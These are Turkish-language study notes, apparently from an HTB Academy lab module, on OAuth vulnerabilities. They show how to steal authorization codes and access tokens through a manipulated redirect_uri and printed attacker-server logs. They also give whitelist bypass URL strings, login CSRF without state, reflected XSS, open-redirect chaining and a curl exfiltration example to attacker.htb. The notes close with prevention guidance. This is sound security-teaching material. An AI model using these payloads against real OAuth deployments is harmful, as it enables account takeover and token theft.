Laboratuvar kurulumu teknik nedenlerden dolayı seçilmiştir. Özellikle, client, resource server ve authorization server farklı virtual hostlarda değil, sadece farklı URL yollarında çalışmaktadır. Gerçek bir dünya ortamında, bu varlıklar büyük olasılıkla farklı domainlerde veya subdomainlerde barındırılacaktır. Ancak bu durum OAuth akışını ya da ilerleyen bölümlerde tartışacağımız saldırıları etkilemez. Ayrıca, dışarıya giden bağlantılar laboratuvar için devre dışı bırakılmıştır, bu nedenle tüm sızıntılar sağlanan saldırgan sunucu üzerinden yapılmalıdır.


## OAuth Client

OAuth client, hayali siber güvenlik eğitim platformu academy.htb'dir. Client/ URL'sini ziyaret ederek client'a erişebiliriz:

![Pasted image 20241218005122.png](/img/user/resimler/Pasted%20image%2020241218005122.png)


### OAuth Resource Server ve Authorization Server

OAuth resource server ve authorization server hayali versiyon control platformu hubgit.htb tarafından temsil edilmektedir. Authorization server sadece OAuth akışında kullanılırken ve onunla doğrudan etkileşime girmeye gerek yokken, /resource/ URL'sine erişerek resource server ile etkileşime girebiliriz:


![Pasted image 20241218005523.png](/img/user/resimler/Pasted%20image%2020241218005523.png)


## OAuth Flow

Şimdi, laboratuvar kurulumumuzdaki örnek bir OAuth akışına göz atalım.

Client'a erişirken ve verilen kimlik bilgileriyle oturum açmaya çalışırken, client'ta kimlik doğrulamanın henüz uygulanmadığını görebiliriz:

![Pasted image 20241218005617.png](/img/user/resimler/Pasted%20image%2020241218005617.png)

Ancak, academy.htb'ye doğrudan giriş yapmak yerine, OAuth kullanarak hubgit.htb hesabımızla academy.htb'ye kimlik doğrulaması yapmaya başlamak için giriş formunun altındaki HubGit.htb Hesabınızla Giriş Yap düğmesine tıklayabiliriz.


#### Authorization Request

Bu düğmeye tıklandığında Authorization Request (Yetkilendirme İsteği) yetkilendirme sunucusuna gönderilir:

![Pasted image 20241218005815.png](/img/user/resimler/Pasted%20image%2020241218005815.png)


#### Resource Owner Authentication

Tarayıcıda, hubgit.htb kimlik bilgilerimizle giriş yapabileceğimiz authorization prompt'u görebiliriz:

![Pasted image 20241218005908.png](/img/user/resimler/Pasted%20image%2020241218005908.png)



#### Authorization Grant

Tarayıcı penceresinde oturum açmak, client'e geri yönlendirmeyle sonuçlanır:

![Pasted image 20241218010100.png](/img/user/resimler/Pasted%20image%2020241218010100.png)

Browser, authorization grant olan yönlendirmeyi takip eder:

![Pasted image 20241218010125.png](/img/user/resimler/Pasted%20image%2020241218010125.png)

Gördüğümüz gibi, authorization grant'a verilen yanıt zaten erişim token'ını içeriyor. Bunun nedeni, access token isteğinin ve access token izninin tarayıcımız üzerinden değil, sunucudan sunucuya iletişim yoluyla gerçekleştirilmesidir. Daha doğrusu, client access token isteğini doğrudan authorization server'a gönderir. Bu nedenle, bu istek bizim için görünmezdir ve proxy'mizde göremeyiz.

#### User data

Client başarıyla bir access token elde ettiğine göre, client academy.htb'ye kimlik doğrulaması yaptık:

![Pasted image 20241218010306.png](/img/user/resimler/Pasted%20image%2020241218010306.png)

Tıpkı Access token request ve Access token grant gibi, resource request ve resource response da server-to-server iletişimidir. Artık hubgit.htb hesabımızın kullanıcı bilgilerini tarayıcıda görebiliriz:

![Pasted image 20241218010346.png](/img/user/resimler/Pasted%20image%2020241218010346.png)

Hesap bilgileri doğrudan academy.htb tarafından talep edilmiştir. Yani yine bu kısım bizim için görünmez.

İşlem tamamlandığına göre, academy.htb kullanıcı bilgilerimize ihtiyaç duymadan hubgit.htb hesabımızdaki detaylara erişti.


## Attacker Server

Son laboratuvar bileşeni, ayrı bir virtual host olan attacker.htb adresindeki saldırgan sunucusudur. Bu, bir saldırganın kontrolü altındaki ayrı bir sistemi simüle eder ve ilerleyen bölümlerde bu sisteme nasıl veri sızdırılacağını göstermek için kullanacağız.

Saldırgan sunucu, GET parametreleri, POST parametreleri ve HTTP headerları dahil olmak üzere kendisine yapılan tüm isteklerin tüm istek parametrelerini loglar. Loglanan verilere /log endpoint adresinden erişilebilir.

Örneğin, param1 ve param2 parametreleri aracılığıyla veri sızdırdığımızı varsayarak aşağıdaki HTTP isteğini yapabiliriz:

```shell-session
[!bash!]$ curl -X POST --data 'param1=Hello' http://attacker.htb/?param2=World
```

Daha sonra, sızan verileri görüntülemek için logu alabiliriz:

```shell-session
[!bash!]$ curl http://attacker.htb/log

-----
/?param2=World
Host: exfiltrate.htb
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 172.17.0.1
X-Forwarded-Host: exfiltrate.htb
X-Forwarded-Server: exfiltrate.htb
Content-Length: 12
Connection: Keep-Alive


param1=Hello
```

Log'a bir web tarayıcısından da erişebiliriz:

![Pasted image 20241218010634.png](/img/user/resimler/Pasted%20image%2020241218010634.png)


# Stealing Access Tokens

OAuth'un nasıl çalıştığını ayrıntılı olarak tartıştığımıza göre, OAuth güvenlik açıklarının ilk ve en ciddi türü olan access token'ın bir saldırgana sızdırılması konusuna geçelim. Bu güvenlik açığı, redirect_uri parametresinin yanlış doğrulanmasının bir sonucudur.


## Stealing Access Tokens

OAuth akışının çalışma şekli nedeniyle, bir saldırgan kurbanın kimliğine bürünebilir ve redirect_uri parametresini kendi kontrolü altındaki bir sisteme yönlendirerek acces token'ını çalabilir. Redirect_uri, authorization server'ı tarafından düzgün bir şekilde doğrulanmazsa, saldırgan böyle bir saldırıyı gerçekleştirmek için bunu manipüle edebilir.

İlk olarak, bir saldırganın manipüle edilmiş bir redirect_uri içeren bir authorization request için bir link oluşturması gerekir. Laboratuvarımızda, bu saldırıyı simüle etmek için saldırgan sunucusunu kullanabiliriz. Saldırgan, saldırı boyunca tutarlı olduğu sürece status parametresini rastgele bir değere ayarlayabilir. Örnek olarak, saldırganın redirect_uri'si saldırgan sunucusuna işaret eden aşağıdaki manipüle edilmiş bağlantıyı oluşturduğunu varsayalım:

```http
http://hubgit.htb/authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.htb/callback&state=somevalue
```

Bir saldırgan, OAuth akışını kendi kimlik bilgileriyle çalıştırarak ve parametreyi not alarak client_id'yi elde edebilir.

Daha sonra, saldırganın sosyal mühendislik veya farklı bir teknikle (bu modülün kapsamı dışındadır) bu bağlantıyı kurbana iletmesi gerekir.

Kurban bağlantıya eriştiğinde, authorization server'ın authorization prompt'u görüntülenir:

![Pasted image 20241218012635.png](/img/user/resimler/Pasted%20image%2020241218012635.png)

Kurban oturum açmaya devam ettiğinde, manipüle edilmiş redirect_uri parametresi nedeniyle saldırgan sunucusuna yönlendirilir:

![Pasted image 20241218012655.png](/img/user/resimler/Pasted%20image%2020241218012655.png)

Sonuç olarak,authorization code artık saldırganın loglardan elde edebileceği saldırgan sunucusuna gönderilmiştir:

```shell-session
[!bash!]$ curl http://attacker.htb/log

-----
/callback?code=Z0FBQUFBQm1BeHdCNEZEQVdxMFR0Tl9aSEg0SThQME9SU2s2V3Y3VE9teTM2V0JLcDRTM0Jwc0NBMG9Oc09vNGlqWjNZMDFVcGlsT3ZnWmdmRzJ3Q0wtdGtSbWNqXzBHY0o4RzBtMzlKN2h3WFlNcjltc2drNkNFUlAzcnJzUTd6SnVFbTJCWmZ6WDYtVm13V1pQRW5kMlBqcWRnQkVReUZRPT0&state=somevalue
Host: attacker.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: 172.17.0.1
X-Forwarded-Host: attacker.htb
X-Forwarded-Server: attacker.htb
Connection: Keep-Alive
```

Artık saldırgan kurbanın authorization code'unu bildiğine göre, geriye kalan tek şey OAuth akışını tamamlamak ve authorization token'ı kurbanın kimliğine bürünmek için geçerli bir access token ile takas etmektir. Saldırgan, gerekli tüm parametreler bilindiği için access token talebini taklit ederek bunu kolayca başarabilir:

```http
GET /client/callback?code=Z0FBQUFBQm1BeHdCNEZEQVdxMFR0Tl9aSEg0SThQME9SU2s2V3Y3VE9teTM2V0JLcDRTM0Jwc0NBMG9Oc09vNGlqWjNZMDFVcGlsT3ZnWmdmRzJ3Q0wtdGtSbWNqXzBHY0o4RzBtMzlKN2h3WFlNcjltc2drNkNFUlAzcnJzUTd6SnVFbTJCWmZ6WDYtVm13V1pQRW5kMlBqcWRnQkVReUZRPT0&state=somevalue HTTP/1.1
Host: hubgit.htb
Cookie: state=somevalue
```

Geriye kalan OAuth akışı client ve authorization server tarafından arka planda tamamlanır. Kurbanın access token'ı response'da döndürülür:

```http
HTTP/1.1 302 FOUND
Date: Tue, 26 Mar 2024 19:13:40 GMT
Server: Werkzeug/3.0.1 Python/3.11.2
Content-Type: text/html; charset=utf-8
Content-Length: 203
Location: /client/
Set-Cookie: access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0Yi1zdGRudCIsImlzcyI6Imh1YmdpdC5odGIiLCJleHAiOjE3MTE0ODQwMjAuODQ2MDAxNn0.5nx4KAunXKVHoz6udsLdho5X0tQ_p03AbjListGoPgQ01uaX_RFkH1rnvOTwe1-NwH8US7slHQUnSsR5-BEFY2EfR7K_mx-9eL7kaxFJ97NXmVSG_bSzsPzjMUTjrpUbfbTSjqQTM5srpUHC811bDSYWduRV4YI0Fso_EsAz4jMUm7ka_sMWMqcc7hkFev3MjmPzQOBkbt3jtJ8DJPkYxFW_6aXdF-1sf8aejbkWO4tJecqG55rHgUvPfDMpTiRLP07jB26odIoBgu01z3Ybfz8y_IQC_0VTU9kEITThdvayaHeyqp-NqHfETlFSiDH__hoePFS_xhw-jP3QIbRVDg; Path=/
```

![Pasted image 20241218013642.png](/img/user/resimler/Pasted%20image%2020241218013642.png)

Saldırgan artık kurban için geçerli bir access token'a sahip olduğundan, bunu kurbanın kimliğine bürünmek için kullanabilir ve academy.htb client'ını kurban olarak kullanabilir:

```http
GET /client/ HTTP/1.1
Host: academy.htb
Cookie:  access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0Yi1zdGRudCIsImlzcyI6Imh1YmdpdC5odGIiLCJleHAiOjE3MTE0ODQwMjAuODQ2MDAxNn0.5nx4KAunXKVHoz6udsLdho5X0tQ_p03AbjListGoPgQ01uaX_RFkH1rnvOTwe1-NwH8US7slHQUnSsR5-BEFY2EfR7K_mx-9eL7kaxFJ97NXmVSG_bSzsPzjMUTjrpUbfbTSjqQTM5srpUHC811bDSYWduRV4YI0Fso_EsAz4jMUm7ka_sMWMqcc7hkFev3MjmPzQOBkbt3jtJ8DJPkYxFW_6aXdF-1sf8aejbkWO4tJecqG55rHgUvPfDMpTiRLP07jB26odIoBgu01z3Ybfz8y_IQC_0VTU9kEITThdvayaHeyqp-NqHfETlFSiDH__hoePFS_xhw-jP3QIbRVDg
```

Bu request'e verilen response , mağdurun hesap bilgilerini içerir:

![Pasted image 20241218013828.png](/img/user/resimler/Pasted%20image%2020241218013828.png)


### Kusurlu Doğrulamayı Atlama

OAuth'un birçok gerçek dünya uygulamasında redirect_uri doğrulanır. Bu doğrulama genellikle herhangi bir dış URL'nin gönderilmesini önlemek için bir whitelist kullanılarak uygulanır. Ancak, URL doğrulamasının nasıl uygulandığına bağlı olarak, bypass potansiyeli olabilir. Manipüle edilen URL muhtemelen aşağıdakine benzer bir hatayla sonuçlanacağından, bir doğrulama kolayca tespit edilebilir:

![Pasted image 20241218014425.png](/img/user/resimler/Pasted%20image%2020241218014425.png)
Bir saldırgan, kendi kimlik bilgileriyle tüm OAuth akışından geçerek ve URL'yi kaydederek beklenen redirect_uri değerini elde edebilir. Bu, saldırganın aşağıdaki URL bileşenlerini içeren farklı URL tabanlı baypaslar denemesini sağlar:

- Subdomains
- Basic Authentication Credentials
- Query parameters
- URL fragments

Örneğin, doğrulama yalnızca redirect_uri'nin http://academy.htb stringiyle başlayıp başlamadığını veya bu stringi içerip içermediğini kontrol ediyorsa, aşağıdaki değerlerle kolayca atlanabilir:

- `http://academy.htb.attacker.htb/callback`
- `http://[[email protected]](/cdn-cgi/l/email-protection)/callback`
- `http://attacker.htb/callback?a=http://academy.htb`
- `http://attacker.htb/callback#http://academy.htb`

![Pasted image 20241218014600.png](/img/user/resimler/Pasted%20image%2020241218014600.png)

Bu noktadan sonra saldırı yukarıda açıklandığı şekilde gerçekleştirilebilir.


### Uygun Olmayan CSRF Koruması

Birkaç bölüm önce tartıştığımız gibi, OAuth akışındaki state parametresi isteğe bağlıdır, ancak güvenlik açısından CSRF koruması olarak hizmet eden şiddetle tavsiye edilen bir parametredir. Bu bölümde, eksik veya yanlış doğrulanmış bir State parametresinin CSRF güvenlik açığına nasıl yol açtığı ve bundan nasıl yararlanılacağı tartışılacaktır.


### Missing state

Gerçek dünyada bir OAuth uygulamasını incelerken, OAuth akışında ayarlanan tüm parametreleri not etmek çok önemlidir. Özellikle ilginç bir hedef, yetkilendirme isteğindeki state parametresidir. Parametre eksikse, OAuth akışına bir CSRF saldırısı mümkün olabilir. Böyle bir saldırının etkisi, OAuth'un gerçek kullanımına bağlı olarak ciddi olabilir.

Şimdilik, durum parametresini kullanmayan bir OAuth uygulaması varsayalım:

![Pasted image 20241218020003.png](/img/user/resimler/Pasted%20image%2020241218020003.png)

Bu durumda bir saldırgan, kurbanın farkında olmadan saldırganın hesabına giriş yapmasıyla sonuçlanan bir Login-CSRF saldırısı gerçekleştirebilir. Böyle bir saldırının sonuçları ilk başta belirsiz görünse de, bu saldırılar kullanıcıların güvenliği ve gizliliği için önemli bir tehdit oluşturmaktadır. Web uygulamasına bağlı olarak, etki var olmayabilir veya ciddi olabilir. Bir kurbanın saldırganın hesabına giriş yaptığı ve giriş yaptığı hesabın kendi hesabı olduğunu düşünerek profiline ödeme bilgilerini girdiği bir senaryo hayal edin. Bu, saldırganın kurbanın ödeme bilgilerini çalmasını sağlar, çünkü kurbanlar bilmeden bu bilgileri saldırganın hesabına eklemişlerdir.

Genel olarak, bu saldırılar kurban verilerinin kaybına neden olabilir. Ancak, genellikle kurbanın kendi hesabı olduğunu düşünerek saldırganın hesabına bilgi girmesini gerektirirler.

#### Attack Execution

State parametresi olmayan bir OAuth akışına yönelik bir saldırının yürütülmesi aşağıdaki gibidir. İlk olarak, saldırganın kendi hesabı için bir authorization code elde etmesi gerekir, bu da bir authorization request göndererek ve saldırganın kimlik bilgilerini kullanarak kimlik doğrulaması yaparak elde edilebilir:

```http
POST /authorization/signin HTTP/1.1
Host: hubgit.htb
Content-Length: 96
Content-Type: application/x-www-form-urlencoded

username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback
```

response , saldırganın hesabına bağlı geçerli bir authorization code içerir:

![Pasted image 20241218020209.png](/img/user/resimler/Pasted%20image%2020241218020209.png)

Saldırgan artık elde edilen authorization code'u kullanarak authorization code grant için URL oluşturabilir:

```http
http://hubgit.htb/client/callback?code=Z0FBQUFBQm1BekxRVGFLdTk5WHZycU9zZ0dCS2IzaWwzWTkxME9tVHJPbXpibTVLV0g0MVRyUVhCSF9vVHVNSHdXX0NZV2FzTHEzTzRFLW5wejU5ai1ONVdxMlc0LU0wMDdURXVPRGYtX05Mb21mZTljTUtzTWwxa1pvdktUVzlWcXJFNzMtZGJ1eWtKcllFQy0xd3RlM3JXUzczUEUtU3lnPT0
```

Bu, normal bir CSRF saldırısında olduğu gibi kurbana sağlanması gereken CSRF saldırısının payload'udur. Bir saldırgan bunu sosyal mühendislik veya oltalama yoluyla başarabilir.

Bir kurban sağlanan bağlantıya tıkladığında, kurbanın tarayıcısı otomatik olarak OAuth akışını tamamlayacak ve yetkilendirme token'ını bir erişim token'ı ile takas ederek kurbanın saldırganın hesabına giriş yapmasını sağlayacaktır:

![Pasted image 20241218020319.png](/img/user/resimler/Pasted%20image%2020241218020319.png)



### State parametresi saldırıyı nasıl önler?

State parametresi yukarıda tartışılan saldırıyı önler. Uygulamaya bağlı olarak, bu genellikle önceki authorization request aynı kullanıcı tarafından başlatılmamışsa, authorization code grant'taki durum değerleri arasında bir uyumsuzluk ile sağlanır.

Örneğin, daha önce olduğu gibi, bir saldırgan kendi hesabı için bir authorization code elde edebilir. Authorization request'te saldırgan status için rastgele bir değer seçebilir:

```http
POST /authorization/signin HTTP/1.1
Host: hubgit.htb
Content-Length: 96
Content-Type: application/x-www-form-urlencoded

username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback&state=1337
```

Tıpkı daha önce olduğu gibi, response saldırganın hesabı için geçerli bir authorization code içerecektir:

![Pasted image 20241218020715.png](/img/user/resimler/Pasted%20image%2020241218020715.png)

```http
http://hubgit.htb/client/callback?code=Z0FBQUFBQm1BelRBRnlnUmRkQXRaclFtaEhFcUhHZ2ZQRURnaEN2bWIxRXEteXhGc2RuMVdWY3FZS1lGMnRrejdMOEEzYUMzS3ZIZlM3OEpVNGNFWmswZ2VKdjV4a2lTMmFpb2NDRFJ5QmFqOVFaUmI1WS1YM0xoVWVOUnhMZ1FJV29sLWN0ZE9sMXZOUzZkYmZBSk9hb25MbW54bnY1QWZ3PT0&state=1337
```

Ancak, kurban şimdi saldırgan tarafından sağlanan URL'ye erişirse, state parametresinde bir uyumsuzluk tespit edilir, istek reddedilir ve OAuth akışı iptal edilir:

![Pasted image 20241218020750.png](/img/user/resimler/Pasted%20image%2020241218020750.png)

Bunun nedeni, saldırgan tarafından sağlanan state parametresinin kurbanın tarayıcısında depolanan cookie deki değerle eşleşmemesi ve bir uyuşmazlığa neden olmasıdır. Bu uyuşmazlığın tam ayrıntıları OAuth uygulamasına bağlı olarak değişebilir, ancak genellikle state değeriyle karşılaştırma için kullanılan cookie tabanlı bir değere bağlıdır.

Tıpkı normal CSRF-tokenler gibi, state parametresinin güvenliği de değerin tahmin edilemez olmasına dayanır. Bir saldırgan değeri tahmin edebilirse, authorization request'lerinde state değerini buna göre ayarlayabilir ve korumayı tamamen ortadan kaldırabilir.



### Ek OAuth Güvenlik Açıkları

OAuth akışının kendisinin yanlış uygulanması nedeniyle ortaya çıkabilecek yaygın güvenlik açıklarını tartıştığımıza göre, yanlış OAuth uygulamaları ile birlikte ortaya çıkabilecek ek güvenlik açıklarına geçelim.


## Cross-Site Scripting (XSS)

En yaygın web güvenlik açıklarından biri cross-site scripting (XSS), özellikle de reflected XSS'dir. Adından da anlaşılacağı gibi, reflected XSS, request'teki bir değer response'a yansıtıldığında ortaya çıkabilir. Bu durum OAuth akışlarında yaygındır.

Laboratuvarımızdaki authorization requeste bir göz atarsak, isteğimizdeki üç parametrenin response'da gizli değerler olarak yansıtıldığını görebiliriz:

![Pasted image 20241218021925.png](/img/user/resimler/Pasted%20image%2020241218021925.png)

Web uygulaması bu değerleri düzgün bir şekilde sanitize etmezse, reflected XSS'ye yol açabilirler. Bu değerleri basit bir uyarı kavram kanıtı payload'u enjekte ederek test edebiliriz:

![Pasted image 20241218022035.png](/img/user/resimler/Pasted%20image%2020241218022035.png)

Parametrenin savunmasız olduğunu doğrulamak için, isteğe bir web tarayıcısından erişebiliriz:

![Pasted image 20241218022051.png](/img/user/resimler/Pasted%20image%2020241218022051.png)

Güvenlik açığı authorization request'te bulunduğundan, bu XSS güvenlik açığı authorization server'ı etkiler ve potansiyel olarak bir kurbanın hesabının tamamen ele geçirilmesine yol açabilir.


### Open Redirect & Chaining Vulnerabilities (Açık Yönlendirme ve Zincirleme Güvenlik Açıkları)


Birkaç bölüm önce tartıştığımız gibi, redirect_uri parametresi kurbanın authorization code'unu çalmak için istismar edilebilir. Ancak bu tür bir güvenlik açığı, redirect URL'sinde uygun whitelist kontrolleri uygulanarak kolayca önlenebilir. Tipik olarak bu, URL'nin protokol, host ve porttan oluşan kaynağını whitelist değerine karşı kontrol ederek yapılır. Bu şekilde, client tüm OAuth akışını bozmadan callback endpoint'i hareket ettirebilir ve saldırganın kendi kontrolü altındaki bir sisteme yönlendirme URL'sini manipüle etmesini engeller. Yönlendirme URL'sinin kaynağı, client tarafından sağlanan önceden tanımlanmış whitelisted değeriyle eşleşmelidir.

Bu mükemmel derecede güvenli görünebilir ve kendi başına da öyledir. Ancak, whitelisted origin'e yüklenen client web uygulaması bir open redirect içerdiğinde bu durum büyük ölçüde değişir. Bazı open redirect'ler güvenlik açığı olabilirken, diğer open redirect'ler, örneğin sosyal medyadaki redirect endpoint'ler gibi, tasarım gereği mevcuttur. Ancak, open redirect bir saldırgan tarafından kurbanın OAuth token'ını çalmak için kullanılabilir.

Bunu daha ayrıntılı incelemek için, OAuth client academy.htb'nin callback endpoint'ini http://academy.htb/callback adresinde barındırdığını ve http://academy.htb/redirect adresinde GET parametresi url'sinde sağlanan herhangi bir URL'ye yönlendirme yapan bir Open Redirect uyguladığını varsayalım. Ayrıca, authorization server hubgit.htb, bir authorization isteğinde sağlanan redirect_uri'yi whitelisted origin http://academy.htb/ ile karşılaştırarak doğrular.

Şimdi, bir saldırgan kurbana aşağıdaki yönlendirme URL'si ile manipüle edilmiş bir authorization request göndererek kurbanın authorization kodunu çalmak için bu senaryodan faydalanabilir:

```
http://academy.htb/redirect?u=http://attacker.htb/callback
```

Bu URL authorization server'ın doğrulamasını geçer. Ancak, kullanıcı tarafından başarılı bir şekilde kimlik doğrulaması yapıldıktan sonra, authentication code ilk olarak http://academy.htb/redirect adresine gönderilir ve bu da http://attacker.htb/callback adresine yönlendirmeye neden olur. Böylece saldırgan, redirect_uri parametresinin doğru şekilde uygulanmış doğrulamasına rağmen authentication code'u elde eder. İstismarın geri kalanı, Access Tokens'ın Çalınması bölümünde açıklandığı gibi çalışır.

Bu senaryo, burada açıklanan gerçek bir dünya hata ödül [raporuyla](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com) sonuçlandı.


### Malicious Client'ı Kötüye Kullanma

Şimdiye kadar saldırganın OAuth akışında bulunmayan ayrı bir aktör olduğunu varsaydık. Ancak, tipik olarak authorization server'lar OAuth client registration'ı destekleyerek bir saldırganın kendi kontrolü altında kendi kötü niyetli OAuth client'ını oluşturmasına olanak sağlar. Saldırgan daha sonra bu client'ı bilmediği kurbanlardan erişim token'ları almak için kullanabilir ve bu token'lar kurban kimliğine bürünmek için uygun olmayan şekilde uygulanmış OAuth client'larında kullanılabilir.

Örneğin, bir saldırgan evil.htb web uygulamasını oluşturabilir ve OAuth kimlik doğrulamasını etkinleştirmek için hubgit.htb ile bir OAuth istemcisi olarak kaydedebilir. Farkında olmayan bir kurban, OAuth kullanarak hubgit.htb hesabıyla evil.htb'de oturum açarsa saldırgan tarafından kontrol edilen client, kullanıcının hubgit.htb'ye access token'ını alır. Saldırgan şimdi bu access token'ı academy.htb'ye erişmek için kullanmayı deneyebilir. Eğer academy.htb client'ı erişim token'ının farklı bir client için verildiğini doğrulamaz ve erişim izni verirse, saldırgan academy.htb'de kurbanın kimliğine bürünebilir.

Buna benzer bir senaryo gerçek dünyada burada anlatıldığı gibi [keşfedilmiştir](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts).



### OAuth Güvenlik Açığı Önleme

Gördüğümüz gibi, OAuth akışının yanlış uygulanmasının web güvenlik açıklarına neden olabileceği birçok yol vardır. Bu güvenlik açıklarından bazıları, tüm kullanıcı oturumunun sızdırılması da dahil olmak üzere yıkıcı sonuçlara yol açmaktadır. Bu güvenlik açıklarını önlemek için, tüm OAuth varlıkları sıkı güvenlik önlemleri uygulamalıdır. Özellikle authorization server ve client, OAuth protokolünün tüm yönlerini sıkı bir şekilde uygulamalı ve bunlara bağlı kalmalıdır.

### OAuth Güvenlik Açığı Önleme
Genel olarak, hatalı uygulamadan kaynaklanan güvenlik açıklarını önlemek için OAuth standardına kesinlikle uyulmalıdır. Bu, tüm OAuth varlıkları için geçerlidir. Ayrıca, CSRF güvenlik açıklarını önlemek için, state parametresi authorization server tarafından zorlanmalı ve standart bunu kesinlikle gerektirmese de client tarafından uygulanmalıdır.

Ek olarak, client mümkünse implicit grant yerine authorization code grant'ı tercih etmelidir. Tüm OAuth flow request ve response'larının kapsamlı bir şekilde doğrulanması, open redirect attack ve token leakage gibi yaygın güvenlik açıklarının önlenmesi için gereklidir. OAuth authorization sunucuları, güvenilir domainlere ait olduklarından emin olmak için redirect URI'lerini dikkatlice doğrulamalı ve şüpheli veya yetkisiz redirect URL'lerine sahip istekleri reddetmelidir. OAuth client'ları access token'ları güvenli bir şekilde saklamalı ve ele geçirilmelerini ve token hırsızlığını önlemek için HTTPS kullanarak güvenli kanallar üzerinden iletilmelerini sağlamalıdır.

Bunun da ötesinde, genel güvenlik önlemleri OAuth uygulamasından sorumlu sistemler için geçerlidir. Buna düzenli güvenlik denetimleri, sızma testleri ve kod incelemeleri dahildir. Bunlar, en son güvenlik tehditleri ve en iyi uygulamalar hakkında bilgi sahibi olurken OAuth uygulamalarındaki güvenlik açıklarını belirlemeye ve azaltmaya yardımcı olabilir. Güvenlik açığı önlemenin bir diğer kritik yönü de OAuth sürecine ekstra bir güvenlik katmanı eklemek için multi-factor authentication (MFA) gibi sağlam kimlik doğrulama mekanizmalarının uygulanmasını içerir. Kullanıcıların kimliklerini parola, biyometri veya tek seferlik kodlar gibi birden fazla faktörle doğrulamalarını gerektiren MFA, kimlik bilgileri tehlikeye girse bile yetkisiz erişim riskini önemli ölçüde azaltır.

OAuth güvenliği ile ilgili en iyi uygulamalar hakkında daha fazla bilgi için bu [belgeye](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) göz atın.
